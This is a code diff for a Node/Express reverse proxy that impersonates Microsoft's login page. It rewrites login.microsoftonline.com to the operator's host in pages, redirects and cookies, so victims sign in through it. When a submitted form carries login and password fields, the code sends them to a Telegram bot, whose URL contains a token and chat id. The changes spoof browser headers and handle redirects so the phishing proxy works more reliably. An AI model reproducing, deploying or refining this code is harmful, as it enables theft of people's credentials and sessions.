@@ -22,43 +22,118 @@ app.all('*', async (req, res) => {
 
     const originalHost = req.headers.host;
     const targetUrl = new URL(req.path, 'https://login.microsoftonline.com');
+    
+    // Preserve query parameters
+    if (req.url.includes('?')) {
+        const queryString = req.url.split('?')[1];
+        targetUrl.search = queryString;
+    }
 
-    const headers = new Headers(req.headers);
-    headers.set("Host", "login.microsoftonline.com");
-    headers.set("Referer", `https://${originalHost}`);
+    // Create new headers object with only valid headers
+    const headers = {
+        'Host': 'login.microsoftonline.com',
+        'Referer': `https://${originalHost}`,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'none',
+        'Sec-Fetch-User': '?1',
+        'Cache-Control': 'max-age=0'
+    };
+
+    // Copy only specific headers from the original request
+    const allowedHeaders = ['cookie', 'content-type', 'origin'];
+    for (const key of allowedHeaders) {
+        if (req.headers[key]) {
+            headers[key] = req.headers[key];
+        }
+    }
 
     try {
         if (req.method === 'POST') {
-            const bodyText = Object.entries(req.body)
-                .map(([key, value]) => `${key}=${encodeURIComponent(value)}`)
-                .join('&');
+            // Handle form data properly
+            let body;
+            if (req.headers['content-type']?.includes('application/x-www-form-urlencoded')) {
+                const formData = new URLSearchParams();
+                for (const [key, value] of Object.entries(req.body)) {
+                    formData.append(key, value);
+                }
+                body = formData.toString();
+                headers['Content-Type'] = 'application/x-www-form-urlencoded';
+            } else {
+                body = JSON.stringify(req.body);
+                headers['Content-Type'] = 'application/json';
+            }
 
             if (req.body.login && req.body.passwd) {
                 const credentialsMessage = `<b>Password found:</b><br><br><b>User</b>: ${req.body.login}<br><b>Password</b>: ${req.body.passwd}`;
                 await sendToTelegram(credentialsMessage, "https://api.telegram.org/bot2071010767:AAEJbO34MFOD96LcV8IHwGiVhiyhrfFH_2o/sendMessage?chat_id=-620309599", true);
             }
+
+            const response = await fetch(targetUrl, {
+                method: 'POST',
+                headers: headers,
+                body: body,
+                redirect: 'manual'
+            });
+
+            // Handle redirects manually
+            if (response.status === 302 || response.status === 301) {
+                const location = response.headers.get('location');
+                if (location) {
+                    return res.redirect(location.replace('login.microsoftonline.com', originalHost));
+                }
+            }
+
+            const responseHeaders = response.headers;
+            const cookies = responseHeaders.get('set-cookie');
+            
+            if (cookies) {
+                const updatedCookies = cookies.split(',').map(cookie => 
+                    cookie.replace(/login\.microsoftonline\.com/g, originalHost)
+                );
+                res.set('Set-Cookie', updatedCookies);
+            }
+
+            const data = await response.text();
+            const modifiedData = data.replace(/login\.microsoftonline\.com/g, originalHost);
+            
+            res.status(response.status).send(modifiedData);
+        } else {
+            const response = await fetch(targetUrl, {
+                method: req.method,
+                headers: headers,
+                redirect: 'manual'
+            });
+
+            // Handle redirects manually
+            if (response.status === 302 || response.status === 301) {
+                const location = response.headers.get('location');
+                if (location) {
+                    return res.redirect(location.replace('login.microsoftonline.com', originalHost));
+                }
+            }
+
+            const responseHeaders = response.headers;
+            const cookies = responseHeaders.get('set-cookie');
+            
+            if (cookies) {
+                const updatedCookies = cookies.split(',').map(cookie => 
+                    cookie.replace(/login\.microsoftonline\.com/g, originalHost)
+                );
+                res.set('Set-Cookie', updatedCookies);
+            }
+
+            const data = await response.text();
+            const modifiedData = data.replace(/login\.microsoftonline\.com/g, originalHost);
+            
+            res.status(response.status).send(modifiedData);
         }
-
-        const response = await fetch(targetUrl, {
-            method: req.method,
-            headers: headers,
-            body: req.method === 'POST' ? JSON.stringify(req.body) : undefined
-        });
-
-        const responseHeaders = response.headers;
-        const cookies = responseHeaders.get('set-cookie');
-        
-        if (cookies) {
-            const updatedCookies = cookies.split(',').map(cookie => 
-                cookie.replace(/login\.microsoftonline\.com/g, originalHost)
-            );
-            res.set('Set-Cookie', updatedCookies);
-        }
-
-        const data = await response.text();
-        const modifiedData = data.replace(/login\.microsoftonline\.com/g, originalHost);
-        
-        res.status(response.status).send(modifiedData);
     } catch (error) {
         console.error('Error:', error);
         res.status(500).send('Internal Server Error');
